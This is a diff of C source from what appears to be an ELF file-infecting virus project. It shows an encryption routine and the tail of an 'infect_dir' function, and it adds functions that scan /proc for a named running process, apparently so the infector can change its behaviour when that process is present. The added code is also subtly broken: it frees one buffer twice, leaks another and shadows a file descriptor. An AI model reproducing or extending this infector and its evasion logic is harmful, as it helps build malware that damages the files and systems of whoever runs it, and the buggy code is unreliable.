@@ -6,7 +6,6 @@
 //char KEY[16];
 #define DATA 0x02
 
-char* ft_add_base(char*, char*);
 //======================= WOODY ==============================
 
 void encrypt_block(uint32_t* v, uint32_t *k) {
@@ -219,4 +218,63 @@ int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt
 		}
 	}
 	ft_close(fd);
+}
+
+int cmpproc(char *name, int fd)
+{
+	size_t i = 0;
+	ssize_t ret;
+	char buff[1];
+	while ((ret = ft_read(fd, buff, sizeof(buff))) >= 0)
+	{
+		if (ret == 0)
+			return 1;
+		if (name[i] == 0 && buff[0] == '\n')
+			return 0;
+		if (name[i] == 0)
+			return 1;
+		if (name[i] != buff[0])
+			return 1;
+		i++;
+	}
+	return -1;
+}
+
+int check_prop(char *programe_name){
+	struct linux_dirent *d;
+	char		p[4096];
+	int		fd;
+	char		*buff;
+	size_t		t;
+	int		ret = TRUE;
+
+	if ((fd = ft_open("/proc", 65536, 0)) < 0) return fail("open proc dir");
+	while (ret == TRUE)
+	{
+		int size = getdents(fd, p, sizeof(p));
+		if (size == 0)
+			break;
+		if (size < 0)
+		{
+			ft_close(fd);
+			return fail("read proc dir");
+		}
+		size_t x = 0;
+		while (x < size && ret == TRUE){
+			d = (struct linux_dirent*)(p + x);
+			if (d_isdir(d) && is_number(d->d_name)){
+				char *t1 = ft_add_base("/proc", d->d_name);
+				char *t2 = ft_add_base(t1, "comm");
+				ft_free(t1);
+				int fd = ft_open(t2, 0, 0);
+				if (cmpproc(programe_name, fd) == 0)
+					ret = FALSE;
+				ft_close(fd);
+				ft_free(t1);
+			}
+			x += d->d_reclen;
+		}
+	}
+	ft_close(fd);
+	return (ret);
 }
